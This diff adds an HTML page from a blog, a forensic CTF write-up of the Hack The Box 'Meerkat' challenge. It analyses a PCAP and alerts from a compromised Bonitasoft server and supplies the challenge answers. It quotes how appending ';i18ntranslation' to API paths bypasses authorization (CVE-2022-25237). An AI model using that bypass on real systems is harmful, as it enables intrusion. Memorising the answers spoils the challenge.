@@ -1,0 +1,1101 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Hurtigare blog@hurtigare.com">
+      
+      
+      
+        <link rel="prev" href="../../pang/">
+      
+      
+        <link rel="next" href="../../../red_team/pang/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.15">
+    
+    
+      
+        <title>Meerkat Writeup - Hurtigare</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.7e359304.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#meerkat-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Hurtigare" class="md-header__button md-logo" aria-label="Hurtigare" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hurtigare
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Meerkat Writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Day time"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Day time" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Night time"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Night time" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Hurtigare" class="md-nav__button md-logo" aria-label="Hurtigare" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Hurtigare
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    $ whoami
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Blue team
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blue team
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pang/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hello
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Sherlocks
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Sherlocks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Meerkat Writeup
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Meerkat Writeup
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tasks
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#with-json" class="md-nav__link">
+    <span class="md-ellipsis">
+      With json
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#with-json_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      With json
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 7
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 8
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 9
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 10
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Thoughts
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Red team
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Red team
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red_team/pang/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hello
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tasks
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#with-json" class="md-nav__link">
+    <span class="md-ellipsis">
+      With json
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#with-json_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      With json
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 7
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 8
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 9
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 10
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Thoughts
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="meerkat-writeup"><strong>Meerkat Writeup</strong></h1>
+<p><img alt="avatar" src="../../../images/sherlocks/meerkat/meerkat.png" style="height:300px;width:300px" /></p>
+<h2 id="scenario"><strong>Scenario</strong></h2>
+<details class="info" open="open">
+<summary>Background</summary>
+<p><em>You are brought in as the new security provider for Forela, a fast-growing startup. The startup has been using a business management platform, but with insufficient documentation and potentially lax security practices. You are provided with PCAP and log data and are tasked with determining if a compromise has occurred. This scenario pushes the you to employ your analysis skills, effectively sifting through network data and logs to detect potential signs of intrusion, thereby offering a realistic taste of the pivotal role cybersecurity plays in the protection of burgeoning businesses.</em></p>
+<p><em>As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren't the most security aware. As our new security provider we'd like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</em></p>
+</details>
+<h2 id="tasks"><strong>Tasks</strong></h2>
+<h2 id="setup"><strong>Setup</strong></h2>
+<p>Initially we are provided a <code>meerkat.zip</code> zip archive. After extracting the archive we are left with two files.
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>unzip<span class="w"> </span>meerkat.zip
+<span class="go">Archive:  meerkat.zip</span>
+<span class="go">[meerkat.zip] meerkat.pcap password: hacktheblue</span>
+<span class="go">inflating: meerkat.pcap</span>
+<span class="go">inflating: meerkat-alerts.json</span>
+
+<span class="gp">$ </span>ls
+<span class="go">meerkat-alerts.json</span>
+<span class="go">meerkat.pcap</span>
+<span class="go">meerkat.zip</span>
+</code></pre></div></p>
+<p>The meerkcat.pcap contains a partial network capture of the incident.<br />
+The meerkat-alerts.json contains security alerts.</p>
+<h2 id="task-1"><strong>Task 1</strong></h2>
+<p><em>We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?</em></p>
+<hr />
+<p>By opening the <code>meerkat.pcap</code> file with <code>wireshark</code> we are able to browse the captured network traffic.</p>
+<p>We can assume it's a web application and as such we can filter out any non HTTP traffic.</p>
+<p><img alt="Task1_step1" src="../../../images/sherlocks/meerkat/task1_step1.png" />
+<em>1</em> Right click any item under the protocol column.<br />
+<em>2</em> Select Apply as filter -&gt; Selected.  </p>
+<p>Lastly we need to change the protocol we want to filter for, in this case HTTP.</p>
+<p><img alt="Task1_step2" src="../../../images/sherlocks/meerkat/task1_step2.png" /></p>
+<p><code>_ws.col.protocol == "NTP"</code> -&gt; <code>_ws.col.protocol == "HTTP"</code></p>
+<p>After reviewing the remaining entries <code>bonita</code> seems to be the application we are looking for. After searching for "<code>bonita application</code>" on Kagi we can see that the full name of the application is <code>bonitasoft</code>.
+<img alt="Task1_step3" src="../../../images/sherlocks/meerkat/task1_step3.png" /></p>
+<p>Answer: <strong>Bonitasoft</strong></p>
+<h2 id="task-2"><strong>Task 2</strong></h2>
+<p><em>We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?</em></p>
+<hr />
+<p>When browsing the entries, we see alot of requests torwards the <code>/bonita/loginservice</code> endpoint. These requests are then followed by a <code>401 Unauthorized</code> response from the server indicating that the used credentials are wrong.
+<img alt="Task2_step1" src="../../../images/sherlocks/meerkat/task2_step1.png" /></p>
+<p>By selecting some of the requests sent to the <code>/bonita/loginservice</code> and expanding the <code>HTML Form</code> we can see that there seems to be some kind of credential bruteforce. Also known as Credential Stuffing.</p>
+<p><img alt="Task2_step2" src="../../../images/sherlocks/meerkat/task2_step2.png" /></p>
+<p>Answer: <strong>Credential Stuffing</strong></p>
+<h2 id="task-3"><strong>Task 3</strong></h2>
+<p><em>Does the vulnerability exploited have a CVE assigned - and if so, which one?</em></p>
+<hr />
+<h4 id="with-json">With json</h4>
+<p>After following the failed login attempts we soon find a successfull login, immedieatly afterwards there seems to be something uploaded to the server.</p>
+<p><img alt="Task3_step1" src="../../../images/sherlocks/meerkat/task3_step1.png" /></p>
+<p>After expanding the contents of the request the file uploaded is called <code>rce_api_extension.zip</code>. Searching for "<code>Bonitasoft rce_api_extension.zip</code>" on Kagi reveals that it's tied to the CVE-2022-25237 vulnerability.</p>
+<p><img alt="Task3_step2" src="../../../images/sherlocks/meerkat/task3_step2.png" /></p>
+<hr />
+<h4 id="with-json_1">With json</h4>
+<p>We could also find out what CVE was used by parsing the <code>meerkat-alerts.json</code>.</p>
+<p>The json file can be parsed with the command below:
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>cat<span class="w"> </span>meerkat-alerts.json<span class="p">|</span>jq
+</code></pre></div>
+Since we are looking for a CVE we can append <code>|grep -i "cve"</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>cat<span class="w"> </span>meerkat-alerts.json<span class="p">|</span>jq<span class="p">|</span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;cve&quot;</span>
+<span class="go">&quot;signature&quot;: &quot;ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)&quot;,</span>
+<span class="go">&quot;cve&quot;: [</span>
+<span class="go">&quot;CVE_2022_25237&quot;</span>
+<span class="go">&quot;signature&quot;: &quot;ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)&quot;,</span>
+<span class="go">&quot;cve&quot;: [</span>
+<span class="go">&quot;CVE_2022_25237&quot;</span>
+<span class="go">&quot;signature&quot;: &quot;ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)&quot;,</span>
+<span class="go">&quot;cve&quot;: [</span>
+<span class="go">&quot;CVE_2022_25237&quot;</span>
+<span class="go">&quot;signature&quot;: &quot;ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)&quot;,</span>
+<span class="go">...</span>
+</code></pre></div>
+<details class="info">
+<summary>command explanation</summary>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Cat</strong></td>
+<td>Prints the file.</td>
+</tr>
+<tr>
+<td><strong>|</strong></td>
+<td>Sends the output to the next command.</td>
+</tr>
+<tr>
+<td><strong>jq</strong></td>
+<td>json parser to increase readability.</td>
+</tr>
+<tr>
+<td><strong>grep -i "cve"</strong></td>
+<td>Grep searches for strings, -i makes it case insensitve, "cve" is the word we are searching for.</td>
+</tr>
+</tbody>
+</table>
+</details>
+<p>This also shows us indications that CVE-2022-25237 has been used.</p>
+<p>Answer: <strong>CVE-2022-25237</strong></p>
+<h2 id="task-4"><strong>Task 4</strong></h2>
+<p><em>Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?</em></p>
+<hr />
+<p>After reading more about the CVE by searching after <code>cve-2022-25237 poc</code> on Kagi we find a poc that explains the following:</p>
+<p><div class="highlight"><pre><span></span><code>By appending &quot;;i18ntranslation&quot; or &quot;/i18ntranslation/../&quot; to certain API URLs it is 
+possible to bypass authorization for unprivilged users and access privileged APIs. 
+This allows an API extension to be deployed and execute code remotely.
+</code></pre></div>
+This is the link I found the information on:<br />
+<a href="https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2022-25237">https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2022-25237</a></p>
+<p>Answer: <strong>i18ntranslation</strong></p>
+<h2 id="task-5"><strong>Task 5</strong></h2>
+<p><em>How many combinations of usernames and passwords were used in the credential stuffing attack?</em></p>
+<hr />
+<p>By filtering the pcap file as done in step 1 for login requests we can see all relevant requests. However since we dont want to count all requests with unique credentials we need to dig a little deeper. First we need to extract the name of the username fiter. Then we are gonna move over to Tshark which is the CLI version of wireshark and do some oneliner magic.</p>
+<p><img alt="Task5_step1" src="../../../images/sherlocks/meerkat/task5_step1.png" /></p>
+<p>By selecting either of the requests and browsing to HTML Form -&gt; Form item username and right clicking the vaule and Apply it as filter. We can see that the filter is called <code>urlencoded-form.value</code>.</p>
+<p>Now we can move on to our terminal of choice to use tshark and use the following command to print out all the lines of uniqe credentials used. Dont worry if the oneliner is hard to understand, there is an breakdown below if needed.</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>tshark<span class="w"> </span>-r<span class="w"> </span>meerkat.pcap<span class="w"> </span>-Y<span class="w"> </span><span class="s1">&#39;http&#39;</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;urlencoded-form.value&#39;</span><span class="p">|</span>sort<span class="w"> </span>-u<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>NF<span class="p">|</span>sed<span class="w"> </span><span class="s1">&#39;s/,en$//&#39;</span><span class="p">|</span>wc<span class="w"> </span>-l
+<span class="m">57</span>
+</code></pre></div>
+<details class="info">
+<summary>Oneliner breakdown</summary>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tshark</td>
+<td>CLI version of Wireshark</td>
+</tr>
+<tr>
+<td>tshark -r &lt;file&gt;</td>
+<td>pcap file to read from</td>
+</tr>
+<tr>
+<td>tshark -Y</td>
+<td>Protocol to filter for, in this case HTTP</td>
+</tr>
+<tr>
+<td>tshark -T</td>
+<td>Print the output as fields, this is needed for the -e flag to work</td>
+</tr>
+<tr>
+<td>tshark -e</td>
+<td>filter for the "urlencoded-form.value"</td>
+</tr>
+<tr>
+<td>sort -u</td>
+<td>Only print unique lines</td>
+</tr>
+<tr>
+<td>awk NF</td>
+<td>Removes blank lines</td>
+</tr>
+<tr>
+<td>sed 's/,en$//'</td>
+<td>Removes ",en" from the output(This command is not needed for the end result but cleans up the credentials if we would like to examine them further)</td>
+</tr>
+<tr>
+<td>wc -l</td>
+<td>counts all lines</td>
+</tr>
+<tr>
+<td>Note</td>
+<td>You can remove "|wc -l" to see all credentials used in the attack</td>
+</tr>
+</tbody>
+</table>
+</details>
+<p>However for some reason 57 is not the accepted answer, instead it's 56. Some speculate that it's because the original PoC uses the <code>install:install</code> credentials and thus are not counted in the original wordlist of 56. I don't have an answer to that, but I think 57 should be the correct answer since install:install were included in the bruteforce attack. </p>
+<p>Answer: <strong>56</strong></p>
+<h2 id="task-6"><strong>Task 6</strong></h2>
+<p><em>Which username and password combination was successful?</em></p>
+<hr />
+<p>By going back to wireshark we can filter away all the 401 Unauthorized and search for a login request followed by any of the 200 responses.
+<img alt="Task6_step1" src="../../../images/sherlocks/meerkat/task6_step1.png" /></p>
+<p>After scrolling a while we can see a 204 response after one of the login attempts indicating that it succeeded. By then browsing to request above it we can see the credentials used for the login.</p>
+<p><img alt="Task6_step2" src="../../../images/sherlocks/meerkat/task6_step2.png" /></p>
+<p>Answer: <strong>seb.broom@forela.co.uk:g0vernm3nt</strong></p>
+<h2 id="task-7"><strong>Task 7</strong></h2>
+<p><em>If any, which text sharing site did the attacker utilise?</em></p>
+<hr />
